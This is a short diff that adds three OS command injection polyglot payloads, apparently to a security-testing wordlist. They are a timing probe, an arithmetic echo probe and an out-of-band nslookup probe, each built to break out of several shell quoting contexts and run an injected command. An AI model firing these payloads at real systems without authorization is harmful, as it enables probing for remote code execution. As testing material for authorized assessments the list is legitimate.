@@ -1,0 +1,6 @@
+##POLYGLOT - OS Command Injection Cross-Shell (Timing)##
+;sleep 5 #'|sleep 5|"$(sleep 5)`sleep 5`
+##POLYGLOT - OS Command Injection Cross-Shell (Math: 1337)##
+;echo $((7*191)) #'|expr 7 \* 191|"$(echo $((7*191)))`expr 7 \* 191`
+##POLYGLOT - OS Command Injection Cross-Shell (OOB)##
+;nslookup {domain} #'|nslookup {domain}|"$(nslookup {domain})`nslookup {domain}`
